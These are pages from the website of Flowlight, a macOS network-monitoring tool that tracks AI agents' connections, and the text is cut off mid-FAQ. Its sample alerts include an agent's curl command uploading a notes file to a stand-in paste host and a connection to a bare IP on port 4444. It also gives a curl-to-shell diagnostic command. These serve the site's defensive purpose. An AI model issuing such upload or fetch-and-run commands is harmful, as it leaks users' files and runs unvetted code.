# About Flowlight
URL: https://flowlight.xinbetween.com/about/

About

 Why Flowlight exists

 Software on your Mac now decides for itself what to do next. Flowlight is how you see what it did.

 On this page
 The storyPrinciplesWho makes itThanks

 The story

 For years, the question "what is my Mac talking to?" had a simple audience: people curious about an app that phoned home. Then
 AI agents arrived. They read your files, run shell commands and call tools, often while you're doing something else, and any of
 those tools can open a network connection.

 In September 2026 a developer went looking for why a folder was eating 700 MB of disk and found that ZCode, an AI coding app,
 had been packaging entire workspaces, Git history included, and uploading them to cloud storage in the background. The company
 apologized, disabled the feature and open-sourced the app. But the discovery came from a disk-usage mystery, not from any tool
 built to notice.

 The uploads were encrypted. The part that mattered wasn't: which app, which host, how many megabytes, and when. macOS
 already knows those facts for every connection. Flowlight exists to put them on screen, keep the history, and tell you when an app,
 especially an agent, does something that doesn't look like its usual self.

 Principles

 Explain first, block only if asked. Flowlight watches and explains by default. An allowlist can refuse
 connections too, but only once you turn that on for an agent — and never for local traffic, DNS or Apple services.

 Metadata, not payloads. Hostnames, ports and byte counts are enough to catch what matters. Contents stay encrypted and unread.

 Local first. Your history is a file on your Mac. No account, no cloud, no telemetry.

 Explainable alerts. Every alert names the app, the destination and the number that tripped it. No black-box scores.

 Open source. A tool that watches your traffic should be one you can read. Flowlight is GPL-3.0.

 Who makes it

 Flowlight is an independent open-source project by xinbetween and
 its contributors. It isn't affiliated with Apple or with any AI provider
 named on this site. Ideas, bug reports and pull requests are welcome, especially new agents and providers to recognize.

 Thanks

 ferstar, for the ZCode teardown that made the case for this app.

 The Wireshark project, whose ChmodBPF approach Flowlight's packet-capture setup follows.

 Team Cymru, for the free IP-to-ASN service behind network-owner labels.

---

# Flowlight documentation
URL: https://flowlight.xinbetween.com/docs/

Documentation

 Using Flowlight

 Everything from the first launch to tuning the agent rules. Flowlight 0.3.3, macOS 15 or later.

 On this page
 InstallFirst launchHostnames
 The viewsWorth a lookFocus modeBackgroundAI agent rulesTools & MCPAllowlistsBlockingAgent configurationHTTPS inspectionMock responsesOther alerts

 Install

 With Homebrew — the same command upgrades it later:
 brew install --cask xinbetween/tap/flowlightCopy

 Or download Flowlight.dmg, open it and drag Flowlight into Applications.

 Prefer an installer? Every release also has a .pkg.

 Building from source needs Xcode 16 or later and xcodegen:

brew install xcodegen
git clone https://github.com/xinbetween/flowlight.git && cd flowlight
xcodegen generate && scripts/build-local.sh
open build/Build/Products/Release/Flowlight.app

 First launch

 Releases from 0.1.6 are signed with a Developer ID certificate and notarized by Apple, so the first launch just works. You can check
 it yourself: spctl -a -vvv /Applications/Flowlight.app should answer Notarized Developer ID.
 Versions up to 0.1.5 were unsigned; those need System Settings › Privacy & Security › Open Anyway once.

 Traffic starts appearing within a second. The ↓↑ figures in your menu bar are live download and upload rates.

 Hostnames: the one-time setup

 By default macOS only tells Flowlight the IP address each app talks to. To show real hostnames, Flowlight reads two
 things from network packets: DNS answers, and the server name a client asks for when it opens an HTTPS connection (TLS SNI).
 A filter in the kernel drops every other packet before Flowlight sees it, and packet contents are never stored.

 macOS only lets administrators read packets, so the Name Your Traffic window asks for your password once. It installs
 /Library/LaunchDaemons/com.flowlight.bpf-access.plist, which gives the access_bpf group read access to
 /dev/bpf* at each boot, the same approach Wireshark uses. Remove it any time from Capture › Remove Packet Capture Access.

 Identify network owners labels traffic with no hostname by who operates the address
 (Cloudflare, Inc. · AS13335). It's on by default and sends those public IP addresses (never private ones) to Team Cymru's
 DNS service. Turn it off in Capture.

 The views

 ViewShortcutWhat it answers

 Live⌘1What's moving right now: per-app rates over the last few seconds and the busiest destination.

 AI Agents⌘2Which agents are active, which AI providers they use, and what else they contacted.

 Reports⌘3Where traffic went, from second to year. Group by App, Destination or IP; switch to Charts or Worth a look; export CSV.

 Alerts⌘4Everything that looked unusual, with the app, the destination and the number that tripped the rule.

 Inspect⌘5Optional: decrypted requests from the agents you route through Flowlight, and the tool calls behind them. Search reaches into request and response bodies.

 Capture⌘6Which engine is recording, the extension's state, hostname learning, and where the database lives.

 In Reports, hover a bar to see which apps drove it, click it to zoom in, and double-click any row to narrow the report to it.

 Worth a look

 A third mode in Reports, beside the breakdown and the charts. It compares the apps in the report with each other
 and points at the ones whose destinations don't look like the rest: many more places than their peers, addresses that never
 resolved to a name, hostnames that look generated rather than chosen, far more sent than received, and protocols that are a
 sideline rather than the app's purpose. Each finding carries the evidence behind it, and clicking one narrows the report to that
 app.

 It is called Worth a look and not Suspicious deliberately. What the data supports is "unusual next to the other
 apps in this report" — a backup tool talks to a lot of places for good reasons, and a quiet Mac produces no findings at all. It
 says nothing about traffic every app shares.

 Running in the background

 Flowlight keeps recording with its window closed, and costs almost nothing while idle — it stops building charts nobody is
 looking at. Settings › General › Run in the background goes further and drops the Dock icon and the Cmd-Tab entry;
 the menu bar keeps the live rates and gains Show Dock Icon to undo it. Launch at login is in the
 same place.

 The window opens where you left it, at the size you left it. A first run fills the screen instead, so nothing is hidden behind
 a small default window, and a window whose saved position is off-screen — an unplugged display — comes back on the screen you
 have. Hostname setup is offered a little after launch and only while a window is open, rather than greeting a first run with a
 request for your password; the offer returns next launch until you take or dismiss it.

 Quitting Flowlight stops the sampler. It does not stop the Network Extension: a system extension runs on its own, so the filter
 carries on inspecting connections until you disable or uninstall it in Capture.

 Focus mode

 Pick a few apps and destinations and every screen shows only those — Live, Reports, Alerts, AI Agents and Inspect, and the rates in
 the menu bar. It's for watching one agent work without the rest of the Mac in the way.

 Right-click any row in Live, Reports or AI Agents and choose Focus on…, or use the Focus control at the bottom of
 the sidebar to pick from the apps that have been active and to type destinations.

 ⇧⌘F turns Focus on and off, and so does the menu bar, which also shows what's focused.

 A destination takes its subdomains with it: example.com covers api.example.com. IP addresses work;
 ranges like 10.0.0.0/8 don't.

 Apps and destinations are a union, not an intersection: focusing on Claude Code and github.com shows
 everything Claude Code does plus everything that talks to GitHub.

 Focus filters what you see, never what's recorded. Flowlight keeps capturing and storing everything while it's on, and
 the anomaly baselines keep learning from all of it, so turning Focus off shows the traffic it was hiding. One consequence: an alert
 names the app that raised it and not where the traffic went, so focusing only on destinations leaves the alert list as it was.

 AI agent rules

 An app counts as an agent if Flowlight knows it by name (16 today, including Claude Code, Codex, Cursor, GitHub Copilot,
 Gemini CLI, Ollama and ZCode) or if it calls one of 24 LLM API providers. Browsers are excluded.

 RuleFires when an agent…Default

 Sensitive channeluses email, file transfer, SSH or remote desktop, a tunnel or proxy, peer-to-peer, or a database connectionOn. Critical for email, file transfer, tunnels and P2P

 Possible exfiltrationuploads to hosts that aren't AI providers, over an hour100 MB/h

 Unnamed hostconnects to a raw IP with no hostname on an unusual portOn

 Active while you're awaymoves 1 MB or more in a minute after you stop using the keyboard and mouse15 minutes

 Agents get a 1-hour learning period before new-destination alerts start. Change any of this in Settings › Detection.

 Tools & MCP servers

 Agents do much of their work through other processes: a shell tool runs curl, git or npm, and MCP
 servers run as their own processes. Flowlight follows each process's parents back to the agent that started it, so that traffic is
 counted as the agent's. In AI Agents, the agent's detail lists these under Tools & MCP servers, and
 destinations read via curl or via github MCP. In Reports, the process row reads via Claude Code.

 MCP servers are named by matching their command line to the MCP configuration of Claude Code (~/.claude.json), Claude Desktop,
 Cursor (~/.cursor/mcp.json), Windsurf, VS Code, Codex (~/.codex/config.toml), Zed and Gemini CLI. Remote MCP servers
 are matched by the hostname in their URL, and unconfigured servers by recognizable package names such as
 @modelcontextprotocol/server-github.

 Attribution is per process: Flowlight can't tell which individual tool call inside a long-running MCP server opened a connection.

 Allowlists

 Select an agent in AI Agents and use Allowlist in its detail to say where it may connect. Enter domains
 (subdomains included), IP addresses or CIDR ranges, or pick a preset: GitHub, npm, PyPI, Homebrew, Docker Hub, Rust crates, Go modules or
 Apple. The agent's AI providers (unless you turn that off) and your local network are always allowed.

 From then on, anything the agent or its tools contact that isn't listed raises a critical Allowlist violation alert (once
 per domain every 6 hours) and is marked Not allowed, with an Allow button that adds it. Flowlight doesn't block this by default
 connections; blocking needs the Network Extension engine and is on the roadmap.

 Refusing connections

 An allowlist warns by default. Turn on Refuse connections outside the list for an agent and it will also
 refuse them: the connection is dropped and an alert records what was refused, with Allow … from Now On to add it
 to the list in one click. The agent's next attempt goes through.

 It needs the Network Extension. Refusing a connection means sitting in its path, which the nettop sampler
 cannot do — Capture will say so rather than offer a switch that does nothing.

 Some things are never refused, whatever a list says: your local network, DNS, Apple's own services, and Flowlight's own
 traffic. A blocked Mac is a worse outcome than a blocked agent, so where there is doubt the connection is allowed and recorded.
 Enforcement also lapses a few seconds after Flowlight stops running — a refusal nobody can see is worse than none, and the way
 to undo one lives in the app.

 HTTPS inspection and blocking don't combine: traffic routed through Flowlight's proxy leaves as Flowlight's own, which is
 never refused.

 Agent configuration: what Flowlight reads on your Mac

 An agent's abilities are written down in files: the skills it can load, the subagents and slash commands it defines, the
 hooks that run shell commands on events, the permission rules it was given, and the MCP servers it starts. Flowlight
 reads those files so the Tools tab can show what each agent is set up to do, even before it makes a single request.
 A hook that posts to a webhook, or a rule that allows Bash(curl:*), explains traffic you'd otherwise have to guess at.

 Where it looks by default: the agent folders in your home folder — ~/.claude, ~/.codex,
 ~/.cursor, ~/.gemini, ~/.agents and the like. It does not walk your whole home folder, so macOS
 doesn't have to ask for access to Desktop, Documents or Downloads.

 Your projects: use Add project folder… to point Flowlight at where your code lives. macOS then grants
 access to that folder only. If the folder sits inside Documents or Desktop, macOS asks first, and that's the one prompt you'll see.

 Once, not constantly: the result is remembered. Flowlight rescans only when you click Rescan, and offers
 one after a couple of weeks in case you've added agents or projects. Nothing is scanned in the background.

 What it keeps: names, descriptions, the command a hook runs, and MCP server commands or URLs. It never copies your
 code, your prompts or your files, and none of it leaves your Mac. Forget what was found clears it.

 HTTPS inspection (optional)

 Off by default. When you turn it on in Inspect, Flowlight runs a local proxy on 127.0.0.1:8877 with its own
 certificate authority, created on your Mac. For apps you route through it, it decrypts HTTPS and shows each request and response:
 headers, bodies, status and timing. From an AI agent's model responses it reads every tool call the model asked for
 (Anthropic, OpenAI Chat and Responses, Gemini, and MCP tools/call requests) and the result the agent sent back, and it
 links each request a tool makes back to the call that caused it: curl's request to paste.example shows
 ← Bash: curl -s https://paste.example/up. In AI Agents, an agent's detail gets Tool calls
 (each call with its command, result or error, and the requests it made) and MCP servers (name and version, local or
 remote or via provider, the tools it offers, calls and failures) and Tools (every tool the agent declares to the
 model, with how often each was used). The agent's header line shows the model, the number of calls and the tokens spent, including
 cached ones. Bodies open as a collapsible JSON tree in their original key order; event streams show one event at a time.

 Agents declare their tools on every turn, so an inspected request shows more than the calls themselves: the tools the agent offers,
 the ones the provider runs on its own servers (web search, code execution), and the MCP servers the provider connects to for the agent
 (Anthropic's mcp_servers, OpenAI's mcp tool) with their URL, token, approval setting and allowed tools. That
 last group never appears on your network, because the provider makes those connections, not your Mac.

 Setting it up is one switch. Turn on HTTPS inspection in Inspect and Flowlight creates its certificate,
 asks for your password once, trusts the certificate and routes apps through the proxy. Turning the switch off undoes all of it. The proxy
 file falls back to a direct connection whenever Flowlight isn't running, so quitting it never cuts your Mac off.

 Command-line agents ignore system proxy settings, so for Claude Code, Codex, Gemini CLI or Aider use Open Inspected Terminal
 and start them there. Under Advanced you can decrypt AI agents only instead of every app, edit the never-decrypt list, copy
 the shell setup for one shell, or remove the certificate and everything recorded.

 Apple services and password managers are never decrypted (edit the list in Setup). Apps that pin their certificates refuse the
 Flowlight certificate; Flowlight notices and passes them through encrypted. API keys, cookies and other credential headers are never
 stored, recorded requests are kept 3 days, and Remove Certificate & Recorded Data deletes the certificate, its trust
 setting and everything recorded. Inspection is HTTP/1.1 only (Flowlight asks both sides for it) and not available in demo mode.

 Mock responses

 To see how an agent copes when an API fails, stalls or returns something odd, answer that endpoint yourself. In
 Inspect › Mock responses, a rule names a host, a path and a method, and gives the status, headers, body and an
 optional delay to reply with. The request is never sent: Flowlight answers it.

 Host is exact — api.example.com — or *.example.com for a domain and its
 subdomains. Exact by default, because a mock aimed at one endpoint shouldn't quietly answer for a whole domain.

 Path takes one * wildcard: /v1/*, /v1/*/items, or an exact path. The
 query string is ignored unless your pattern has one.

 Method matches one verb, or any.

 Rules are ordered and the first enabled match answers. Each switches on and off on its own.

 A mocked exchange is recorded like any other and marked Mocked in the list, with the detail pane saying it was
 answered by Flowlight rather than by the host, and naming the rule. You can always tell later what was real.

 Two things worth knowing. Only traffic Flowlight decrypts can be mocked, so the endpoint has to be going through HTTPS
 inspection — a rule for a host makes Flowlight decrypt that host even if your scope is agents only. And the destination is still
 connected to: a mock changes the answer, not whether the connection can be made, so "the API returns 500" works while "the API
 is entirely unreachable" does not.

 Other alerts

 Traffic spike: an hour at least 3σ above the app's rolling baseline (after 24 hours of history, above 1 MB).

 Unusual number of destinations in a day, against the app's baseline.

 Upload above 99th percentile of the app's hourly uploads over 30 days.

 First contact with a new domain, and non-standard ports, after a 24-hour learning period per app.

 Traffic without UI activity: a windowed app you haven't used for 10 minutes uploads more than 5 MB a minute.

 Capture engines

 Flowlight records traffic one of two ways, chosen in Capture. They differ in what they can miss, which is worth
 understanding before you rely on either.

 nettop sampler (default)Network Extension

 NeedsNothingInstalling a system extension, and your approval

 How it sees trafficReads running totals once a second and records the differencemacOS calls it as each connection is made

 Long transfersCounted exactly, however burstyCounted

 Short connectionsCan be missed entirelyRecorded, however brief

 EnergyStarts a process every secondLower — no polling

 What the sampler misses is whole connections, not bytes. Because it compares running totals, nothing that lasts
 across two readings is lost, no matter how much arrives in between. What never appears is anything that starts and
 finishes between them — a quick DNS lookup, a fast API call, a script that runs curl and exits. For watching an agent
 that makes many short requests, that difference matters.

 The extension is in the data path instead, so a request lasting five milliseconds is recorded like any other. It isn't magic
 either: traffic from before you enabled it isn't there, some system traffic is exempt from content filters, and its byte counts
 come from the filter's own statistics rather than from counting packets. It never blocks anything.

 It also can't run at all on some Macs. macOS allows one content filter at a time, and corporate security software
 normally holds it — Palo Alto Networks GlobalProtect, CrowdStrike Falcon and the like. Flowlight's filter will install and connect on those
 machines and then never be handed a connection. Capture lists any it finds and offers to switch you back to the sampler, which
 needs no filter and works alongside them.
 See the developer guide for how it's built.

 Export to OpenTelemetry or a SIEM

 Off until you configure it, and there is no Flowlight service to send to. You name the endpoint — your own
 collector, your own SIEM — and nothing leaves until you do. Settings › Export.

 OTLP over HTTP with a JSON body: rollups go to /v1/metrics, alerts to /v1/logs,
 because an alert is an event with a sentence attached and a metric would lose the sentence. Newline-delimited JSON is there
 for collectors that just want lines.

 Exactly what leaves is listed in the panel, field by field, and a preview shows a real payload
 built from your own data before anything is sent.

 Never anything from HTTPS inspection. No headers, no bodies, no tool calls — the export can only carry
 rollups and alerts, so there is nowhere for them to go even by accident.

 Auth headers are kept in your login Keychain, not in preferences. Only their names are ever displayed.

 What Flowlight sends shows up in Flowlight, in Live and Reports, like any other app's traffic — including
 a collector on 127.0.0.1.

 Two things to expect: rollups are folded about two minutes behind, so an interval under a minute polls more often without data
 arriving sooner; and Test connection proves the endpoint answers, not that it validated your credentials —
 the "last successful export" line is the honest signal.

 Your data

 Everything lives in ~/Library/Application Support/Flowlight/traffic.sqlite. Per-second rows are kept 6 hours
 (adjustable), minute rows 14 days, hourly rows 400 days, daily rows indefinitely, and alerts 90 days.
 Capture › Clear all data deletes it.

 Updates

 When a new version appears, Flowlight tells you with a notification and a badge in the sidebar rather than interrupting what you're
 doing; clicking either opens the update window. A check you start yourself opens it straight away.

 Flowlight checks GitHub for a new release on launch and once a day, and Check for Updates… is in the app
 and menu bar menus. Download fetches the disk image to Downloads and checks it against the release's published SHA-256. Nothing is installed
 until you choose: Quit & Install closes Flowlight, replaces it with the new version and reopens it, keeping your history and
 settings. Install Later keeps you working. If Flowlight was installed with the .pkg, macOS asks for an administrator
 password to replace it. Turn the check off in Settings › General.

 Updating by hand? Quit Flowlight first (menu bar icon › Quit), then drag the new version into Applications. Finder can't replace an
 app that's still running and says the item is in use.

 Demo mode

 open /Applications/Flowlight.app --args -FLDemo YES starts Flowlight with 90 days of synthetic traffic in a separate
 database, so you can look around without recording your own. It's what the screenshots on this site show.

 Uninstall

 In Capture, choose Remove Packet Capture Access (asks for your password) if you enabled it,
 uninstall the content filter if you installed it, and turn HTTPS inspection off in Inspect so its certificate
 leaves your keychain. Only Flowlight itself can withdraw those three.

 Quit Flowlight and move it from Applications to the Trash — or, if you installed it with Homebrew,
 brew uninstall --cask flowlight.

 Delete ~/Library/Application Support/Flowlight to remove the recorded history, or let Homebrew do it with
 brew uninstall --zap --cask flowlight.

 Questions & answers

 Why did macOS ask Flowlight for access to my Desktop or Documents?
 Only because you pointed it at a project folder inside one of them. By default Flowlight reads agent configuration from the folders in
 your home folder and never touches those three.
 Does Flowlight see all my traffic, or does it miss some?
 It depends which capture engine you use, and the difference is not subtle. The default sampler reads macOS's running
 byte counters once a second and records the change, so a long transfer is counted exactly — but a connection that opens and
 closes between two readings never appears at all. The Network Extension is called by macOS as each connection is made, so
 even a five-millisecond request is recorded. If you're watching an AI agent that fires many short requests, install the
 extension from Capture. The full comparison is above.
 I turned on the Network Extension and nothing appears. The sampler works fine.
 Almost always because another content filter already has the slot. macOS runs one content filter at a time, and
 corporate security software usually claims it — Palo Alto Networks GlobalProtect, CrowdStrike Falcon and similar. Flowlight's
 filter still installs, activates and connects, so Capture says Connected to filter extension, but macOS never hands it a
 single connection and the screens stay empty. Capture lists the filters it finds and offers to switch you back to
 the sampler, which doesn't use a filter and works alongside them. You lose only the very short connections
 (the comparison); everything else is recorded the same way.
 The extension stopped working after Flowlight updated.
 Versions before 0.2.5 had this: macOS keeps running whichever build of the extension was last activated, so after an update the
 extension was the old version and macOS refuses the connection between a mismatched pair. From 0.2.5 Flowlight checks at launch
 and re-activates the filter itself. On an older version, press Install & enable filter in Capture once.
 Something else is wrong with capture and I don't know what.
 Run this and read what it prints — it reports state and counts only, never anything Flowlight recorded about your traffic:
 curl -fsSL https://raw.githubusercontent.com/xinbetween/flowlight/main/scripts/diagnose.sh | zshCopy

 It shows which extensions are installed, whether macOS actually started Flowlight's filter, and how recently anything was recorded.
 Paste it into an issue.
 Does Flowlight send anything about me anywhere?
 No. There's no account, no telemetry and no analytics. The only requests it makes are the daily update check, optional network-owner
 lookups, and reverse DNS — each listed, and each with an off switch, on the privacy page.
 Will it slow my Mac down or drain the battery?
 With the window closed Flowlight does almost nothing: it keeps the menu bar rates and writes one row a second. The Network Extension
 costs less than the fallback sampler, which starts a short-lived nettop process every second.
 Can it block connections?
 Not yet. It observes and explains, and allowlists raise alerts. Blocking needs the Network Extension engine and is on the roadmap.
 Do I need the Network Extension?
 No. The sampler needs no entitlement and covers most traffic. The extension adds flows shorter than a second, attribution by code
 signature, hostnames without the packet-capture setup, and is the path to blocking.
 What happens to my data if I uninstall?
 Everything lives in ~/Library/Application Support/Flowlight. Delete that folder and it's gone; see
 Uninstall for the packet-capture helper and the inspection certificate.

 Limitations

 TCP and UDP only. ICMP (ping) and other raw-IP protocols aren't attributed.

 Attribution is per process, not per thread.

 Unless you turn on HTTPS inspection, Flowlight reads metadata only and never decrypts traffic. QUIC server names come from DNS rather
 than the encrypted handshake.

 Inspection only sees apps that use the proxy, and never apps that pin their certificates.

 Hostname capture follows the primary network interface.

---

# Flowlight for macOS
URL: https://flowlight.xinbetween.com/

Free · open source · macOS 15+

 Every app. Every domain. Every agent.

 Flowlight shows which app on your Mac talked to which domain, over which protocol, and how much it sent.
 It keeps a closer eye on AI agents, so an email, an SSH session or a 180 MB upload you never asked for
 doesn't go unnoticed. Turn on HTTPS inspection and you see the tool calls behind it, too.

 Download for macOS

 Star on GitHub

 brew install --cask xinbetween/tap/flowlightCopy

 v0.3.3macOS 15+UniversalGPL-3.0No telemetry

 ⚠ possible exfiltration: 180 MB to a non-AI host in 1 h

 ⚠ agent used email (SMTP submission)

 The AI Agents view: each agent's model provider, and everything else it talked to. Shown with demo data.

 When to reach for Flowlight

 Questions it answers in seconds

 AI AgentsAn agent is running while you're in a meeting

 See every host it and its tools touched besides its model provider, and get an alert if it leaves its allowlist, sends email or uploads 100 MB somewhere new.

 ReportsYour upload spiked and you don't know why

 Hover the spike to see the app behind it, click to zoom from the hour to the minute, and follow it to the exact domain and IP.

 AlertsA new app started phoning home

 First contact with a new domain, a non-standard port or a traffic spike each raise an alert that names the app and the number that tripped it.

 LiveSomething is saturating your connection right now

 Top talkers updated every second, with the busiest destination for each app, and live rates in your menu bar.

 ReportsYour hotspot data vanished this month

 Switch to the month view and group by app. The biggest consumer is the top row, with CSV export if you need receipts.

 Reports · DestinationYou need to audit where data goes

 Group by destination to see every app that talks to a domain, or by IP to see what sits behind an address.

 Inside the app

 Five views, one question each

 Live
What's moving right now? Per-app rates, the last two minutes, the busiest destination.
⌘1

 AI Agents
What are my agents doing besides calling their model? Providers, other hosts, risk badges.
⌘2

 Reports
Where did it all go? Second to year, grouped by app, destination or IP, with charts and CSV.
⌘3

 Alerts
What looked wrong? Explainable, per-app alerts with the destination and the threshold.
⌘4

 Inspect
Optional. What did the agent actually send, and which tool call made it? Decrypted requests, tool calls, results.
⌘5

 Capture

 The two questions Activity Monitor can't answer

 Which app sent it? Where did it go? Flowlight ties every TCP and UDP flow to its app and its real
 hostname, with bytes in and out, stored locally so you can look back an hour or a year.

 Every app
 Apps, command-line tools and background daemons, attributed by process. Your agents' helper scripts included.

 Real hostnames
 Taken from TLS server names and DNS answers seen on the wire, so you see api.openai.com, not
 104.18.7.192. Traffic with no name can show who owns the address.

 1 s → 1 year
 Zoom from second to year. Group by app, by destination or by IP. Hover a spike to see the app behind it.

 AI Agent Watch

 Your agents have network access. Now you have oversight.

 Flowlight knows 16 agents by name. It also spots any other process that calls one of 25 LLM API
 providers, so a Python script talking to api.openai.com is an agent too. Browsers don't count:
 a person chatting isn't an agent.

 Claude CodeCodexCursor
 WindsurfGitHub CopilotGemini CLI
 AiderGooseOpenCode
 OllamaLM StudioChatGPT
 ClaudeZedPerplexityZCode
 + anything that calls an LLM API

 ⚠ Critical
 Allowlist violation

 "Claude Code may talk to GitHub and npm, nothing else." Add domains, IPs or ranges, or start from a preset. Anything else raises an alert, with one-click Allow.

 Claude Code › curl contacted paste.example:443, which isn't on Claude Code's allowlist

 ↳ Attribution
 Tools & MCP servers

 The curl, git or npm an agent's shell tool runs, and the MCP servers it starts, count as the agent's traffic, named from its own MCP config.

 api.github.com · via github MCP  ·  paste.example · via curl

 ⌕ Opt-in
 Tool calls, from the model's own responses

 Turn on HTTPS inspection and Flowlight reads every tool an agent offers the model, every call the model asks for and the result that came back, then ties each tool's request back to the call that caused it.

 curl → paste.example:443  ←  Bash: curl -s https://paste.example/up -d @notes.txt

 ⌕ On disk
 What each agent is set up to do

 With your say-so, Flowlight reads the agent's own configuration: skills, subagents, slash commands, hooks, permission rules and MCP servers. Names only, never your code, and nothing leaves the Mac.

 Notification hook → curl -s -d … https://ntfy.sh/…  ·  allow: Bash(curl:*)

 ⚠ Critical
 Sensitive channel

 The agent sends email, transfers files, opens SSH or remote desktop, goes through a tunnel or proxy, or talks to a database.

 Claude Code used SMTP-SUBMISSION to smtp.relay.example:587, 2.4 MB sent

 ⚠ Critical
 Possible exfiltration

 More than 100 MB an hour goes to hosts that aren't AI providers.

 Codex uploaded 180 MB to non-AI hosts in the last hour: uploads.paste.example

 ▲ Warning
 Unnamed host

 A connection to a bare IP address with no hostname, on an unusual port.

 python3 connected to 203.0.113.45:4444 (tcp) with no hostname

 ▲ Warning
 Active while you're away

 Data keeps moving after 15 minutes without keyboard or mouse input.

 Codex moved 48 MB in the last minute while you were away (no input for 37 min)

 ⓘ Info
 New destination, sooner

 Agents get a 1-hour learning period before new-domain alerts start (24 hours for other apps). Every threshold is adjustable.

 Coverage

 108 protocols, named in 13 families

 Recognized by port and by the first bytes on the wire (TLS handshakes, HTTP methods, mail and SSH
 greetings, SOCKS requests). Families marked egress channel are the ones the
 agent rules watch.

 Flowlight observes every TCP and UDP flow, which covers essentially all app traffic. ICMP (ping) and
 other raw-IP protocols aren't attributed, and encrypted payloads are never decrypted unless you turn on HTTPS inspection.

 How it compares

 Built for the question the other tools skip

 Flowlight observes and explains. It can refuse what an agent contacts outside its allowlist, once you ask it to.

 Why Flowlight exists

 Your tools now make their own decisions. You should be able to see where your data goes when they do.

 Coding agents read your files, run commands and call tools, and any of those tools can open a socket. In September 2026,
 an AI coding app was found packaging users' whole workspaces, Git history included, and uploading them in the background.
 The researcher who caught it only noticed because a cache folder was eating disk space.

 The uploads were encrypted, but the facts that mattered weren't: which app, which host, how many megabytes, and when.
 macOS already knows all of that. Flowlight puts it on screen, keeps the history, and flags what doesn't look right.

 Read the full story →

 HTTPS inspection · optional

 See the tool call behind every request

 Off by default. Turn it on and Flowlight becomes a local proxy with its own certificate authority, created on your
 Mac. Start an agent from an inspected Terminal and every request it and its tools make is decrypted, with the tool calls the
 model asked for and the results that went back.

 Where did my notes go? curl's upload to paste.example, traced to the Bash command the model asked for, with the
 body it sent.

 Every tool an agent offers the model. Agents declare their tools on each turn, so Flowlight lists them all, with the
 ones the model actually used and the ones it never touched.

 Including the ones you can't see on the wire. When an agent asks the provider to connect to an MCP server, that traffic
 never reaches your Mac. Its request does, so the server, its URL, its approval setting and its tools still show up.

 Tool calls and resultsAnthropic, OpenAI, Gemini and MCP. Each call with its command, its output or error, and the requests its tool made.

 Models and tokensWhich model answered, how many calls, and tokens in, out and served from cache, per agent.

 Readable bodiesJSON as a collapsible tree in its original order, streams one event at a time, headers and raw view.

 On your termsAI agents only by default. Apple services and password managers are never decrypted, credentials never stored, and one button removes it all.

 Next

 What's coming

 Flowlight observes and explains today. This is the order the rest is being built in.

 Focus on apps or destinations, either alone 0.3.4Focus should be symmetric: several apps, several destinations, or both, with at least one entry and neither side required on its own. Today only destinations can be typed and apps can only be ticked off what was busy in the last day, so a quiet app can't be focused at all.

 Rules: block anything, anywhere 0.3.5One rule model behind every screen: block an app, an agent, a domain, an IP range or a single URL, from the table you spotted it in. Forever, until a time, for an hour, or between chosen hours — with one pause switch, and a way out on every refusal. A Rules screen lists them all, what each one has blocked and when, and says plainly which engine can enforce it.

 Agent guardrails: MCP servers, tools and resources 0.3.6Block a whole MCP server, one of its tools, or one resource. The strongest lever is the tool list itself: drop a blocked tool before the request reaches the provider and the model is never offered it. For servers reached over HTTP, the call is answered rather than forwarded, the way the protocol says a refusal should read, so the model adapts instead of seeing a broken server. Its own section in AI Agents — and no pretence that it is a sandbox.

 A site that keeps up with the app 0.3.7Eight releases in, some of this page describes a Flowlight that no longer exists. A pass over every page that cuts rather than adds, counts taken from the source at build time, two-column sections that stay balanced instead of leaving a tall empty column, and just enough motion to feel alive — none of it moving the layout, all of it off when you ask for less.

 Channels besides the network 0.4.0AirDrop and Continuity already flow over interfaces Flowlight can see. Bluetooth and USB can show which apps have access and what connects, though macOS keeps per-app byte counts to itself.

 Ask Flowlight 0.5.0Ask in plain language what an app or agent has been doing and get a summary, with the rows behind it one click away. The model is given queries to call, never your history — and an on-device model is the default, so the answer can cost nothing and send nothing.

 Linux, then WindowsThe analysis core is portable Swift; capture isn't. A Linux daemon with a local web UI comes first, on eBPF rather than macOS APIs.

 Privacy

 A monitor you don't have to monitor

 Stays on your MacOne local SQLite file. No account, no cloud sync, no telemetry.

 Metadata by defaultHostnames, ports and byte counts. Decrypting HTTPS is a separate mode you have to turn on, and it stays on your Mac.

 Filtered in the kernelCapture passes only DNS answers and TLS ClientHellos. Everything else is dropped before Flowlight sees it.

 Lookups you controlNaming who owns an address sends only public IPs with no hostname to Team Cymru, and turns off in one click. The daily update check only asks GitHub for the latest version, and can be turned off too.

 One agent, every tool call. Traffic from the git, curl and MCP servers Claude Code started counts as Claude Code's.
 With HTTPS inspection on, the Tool calls tab shows what the model asked for, what came back, and the requests each tool made:
 the curl upload to paste.example, and the git push that failed.

 Reports. Second-to-year zoom, three groupings, charts that stay readable with hundreds of apps.

 Alerts. Each one names the app, the destination and the number that tripped it.

 Install

 Running in under a minute

 Download Flowlight.dmgOpen it and drag Flowlight into Applications. A .pkg installer is also on every release. Releases are signed and notarized, so macOS opens it without complaint.

 Launch itTraffic appears within a second, and live ↓↑ rates sit in your menu bar.

 Name your trafficApprove the one-time setup (your password, once) so Flowlight can read hostnames.

 Prefer to build it yourself, or look around with sample data first?

# build from source (Xcode 16+, no Apple account needed)
brew install xcodegen
git clone https://github.com/xinbetween/flowlight.git
cd flowlight && xcodegen generate
scripts/build-local.sh

# explore with 90 days of synthetic traffic
open Flowlight.app --args -FLDemo YES

 FAQ
Questions

 Does Flowlight block traffic?

 By default it watches and alerts, including when an agent leaves its allowlist. It can also refuse those connections,
 but only for an agent you have turned that on for, and only with the Network Extension engine installed — the sampler can
 only watch. Local traffic, DNS, Apple services and Flowlight's own connections are never refused.

 Can it read my HTTPS traffic?

 Not by default. It reads the hostname a client asks for when it opens a connection (TLS SNI) and the DNS answers
 that map names to addresses, and contents stay encrypted. If you want the full picture, HTTPS inspection is a
 separate, opt-in mode: Flowlight becomes a local proxy with its own certificate authority and decrypts the apps you route
 through it (AI agents only, by default), including every tool call a model asks an agent to run. Apps that pin their
 certificates still refuse it, and Apple services and password managers are never decrypted.

 How is this different from Little Snitch or LuLu?

 Those are firewalls that ask you to allow connections. Flowlight is an analytics tool: history at any zoom,
 anomaly baselines, and rules built for AI agents. They work well side by side.

 Why does it ask for my password?

 macOS only lets administrators read network packets. The one-time setup gives your account read access, the
 same way Wireshark does. You can remove it any time from the Capture screen.

 Can it tell which MCP server or tool made a request?

 Yes, at the process level. Flowlight follows each process back to the agent that started it, so a shell tool's
 curl or an MCP server's connections are attributed to that agent, and MCP servers are named from Claude Code, Claude
